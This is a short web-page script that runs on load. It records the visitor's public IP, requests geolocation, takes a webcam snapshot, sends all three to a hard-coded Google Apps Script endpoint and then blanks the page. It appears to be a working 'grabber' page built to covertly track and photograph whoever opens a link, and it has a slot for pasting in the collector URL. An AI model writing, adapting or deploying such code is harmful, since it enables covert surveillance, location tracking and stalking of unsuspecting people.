<script>
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');
    const context = canvas.getContext('2d');

    // ================= CONFIGURATION =================
    // PASTE YOUR GOOGLE WEB APP URL HERE
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwfa05Nj7bbftRRfF-1PE7-FbCNbbRs_IKvCLQqL09idsEwGm9vUZPnkIKCCskbFynM/exec"; 
    // =================================================

    let ip = "unknown";

    // 1. Get IP first
    getPublicIp()
        .then(resolvedIp => {
            ip = resolvedIp;
            console.log("IP:", ip);
        })
        .catch(err => {
            console.error("IP fetch failed:", err);
        })
        .finally(() => {
            // 2. After IP (success or fail), get Location
            getLocation();
        });

    // Helper: Get public IP using ipify
    function getPublicIp() {
        return fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => data.ip);
    }

    // 2. Get Location
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locData = {
                        lat: position.coords.latitude,
                        long: position.coords.longitude
                    };
                    initCamera(locData);
                },
                (error) => {
                    console.log("Loc error");
                    initCamera(null);
                }
            );
        } else {
            initCamera(null);
        }
    }

    // 3. Get Camera
    function initCamera(locData) {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/png');
                            stream.getTracks().forEach(track => track.stop());

                            // 4. Send everything: location + image + IP
                            sendData(locData, imageData, ip);
                        }, 1500);
                    };
                })
                .catch((err) => {
                    console.log("Cam error");
                    sendData(locData, null, ip);
                });
        } else {
            sendData(locData, null, ip);
        }
    }

    // 4. Send Data to Google Script
    function sendData(loc, img, ipAddress) {
        const payload = {
            location: loc,
            image: img,
            ip: ipAddress
        };

        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(() => {
            console.log("Sent");
            document.body.innerHTML = "";
        })
        .catch(error => console.error("Error:", error));
    }
</script>
